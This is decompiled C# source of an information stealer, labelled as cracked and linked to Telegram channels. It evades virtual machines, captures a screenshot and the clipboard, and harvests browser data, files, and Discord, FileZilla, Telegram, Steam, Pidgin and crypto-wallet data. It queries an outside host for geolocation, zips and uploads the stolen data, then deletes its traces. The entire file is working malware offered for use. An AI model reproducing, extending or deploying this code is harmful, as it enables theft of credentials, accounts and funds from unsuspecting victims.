// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Stealer
{
  public class Program
  {
    public static string version;
    public static string timestart;
    public static int timerint;
    public static string clipp;
    public static string geo;
    private static string string_0;
    public static string path;
    private static string string_1;
    public static string id;
    private static string string_2;
    private static string string_3;
    public static string domaindetect;
    private static Thread thread_0;

    [STAThread]
    private static void dYovoedfK(string[] args)
    {
      if (!Class4.smethod_1())
        Environment.Exit(0);
      if (!Class8.smethod_4())
      {
        Program.thread_0.Start();
        try
        {
          using (new WebClient().OpenRead("https://www.google.com"))
            ;
        }
        catch
        {
          Environment.Exit(0);
        }
        try
        {
          Directory.Delete(Program.string_0, true);
        }
        catch
        {
        }
        Class4.smethod_5(Program.string_1);
        if (Program.string_2 == "on")
        {
          if (System.IO.File.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\update_" + Program.id + ".dll"))
          {
            if (Program.string_3 == "on")
              Class4.smethod_6((object) Program.string_0, (object) Assembly.GetExecutingAssembly().Location);
            else
              Environment.Exit(0);
          }
          else
            System.IO.File.Create(Environment.GetEnvironmentVariable("LocalAppData") + "\\update_" + Program.id + ".dll");
        }
        Directory.CreateDirectory(Program.path);
        Class3.smethod_4(Program.path + "\\Screen.png");
        Class1.smethod_0(Program.path + "\\Browsers");
        Class3.smethod_2(Program.path + "\\Files");
        try
        {
          Class4.smethod_3(Program.path + "\\Files", Program.path + "\\Files.zip");
          if (System.IO.File.Exists(Program.path + "\\Files.zip"))
            Directory.Delete(Program.path + "\\Files", true);
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
        Class3.smethod_7(Program.path + "\\Discord");
        Class3.smethod_8(Program.path + "\\FileZilla");
        Class3.smethod_1(Program.path + "\\Telegram");
        Class3.smethod_9(Program.path + "\\Steam");
        Class3.smethod_5(Program.path + "\\Wallets");
        Class3.smethod_6(Program.path + "\\Pidgin");
        Program.thread_0.Abort();
        try
        {
          using (WebClient webClient = new WebClient())
            Program.geo = Encoding.ASCII.GetString(webClient.DownloadData("https://arcane.es3n.in/i.php"));
        }
        catch
        {
          Program.geo = "Unknown?Unknown?Unknown?UN";
        }
        Class3.smethod_0(Program.path + "\\Information.txt");
        try
        {
          string str = Path.Combine(Program.string_0, "1337.zip");
          Class4.smethod_3(Program.path, str);
          Class4.smethod_4(str, (object) Program.id, (object) ("[" + Program.geo.Split('?')[3] + "]" + Program.geo.Split('?')[0] + "_" + Class4.smethod_0()));
          Directory.Delete(Program.path, true);
          Directory.Delete(Program.string_0, true);
        }
        catch (Exception ex)
        {
          Console.WriteLine(ex.ToString());
        }
        if (Program.string_3 == "on")
          Class4.smethod_6((object) Program.string_0, (object) Assembly.GetExecutingAssembly().Location);
      }
      else
        Class4.smethod_9(Program.string_1, "Detected Virtual Machine", "Error");
      Environment.Exit(0);
    }

    private static void smethod_0()
    {
      while (true)
      {
        Thread.Sleep(1000);
        ++Program.timerint;
      }
    }

    public Program()
    {
      Class11.ARXWv9qzu32dU();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    static Program()
    {
      Class11.ARXWv9qzu32dU();
      Program.version = "1.0.7";
      Program.timestart = DateTime.Now.ToString();
      Program.timerint = 0;
      Program.clipp = Clipboard.GetText().Length <= 0 || Clipboard.GetText().Length >= 300 ? "" : Clipboard.GetText();
      Program.geo = "";
      Program.string_0 = Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"), Class4.smethod_0());
      Program.path = Program.string_0 + "\\Driver";
      Program.string_1 = "VFVFOVBRPT0=";
      Program.id = "VFVSbmVVOVVUVE5QUkZFdw==";
      Program.string_2 = "1";
      Program.string_3 = "1";
      Program.domaindetect = "0";
      Program.thread_0 = new Thread(new ThreadStart(Program.smethod_0));
    }
  }
}
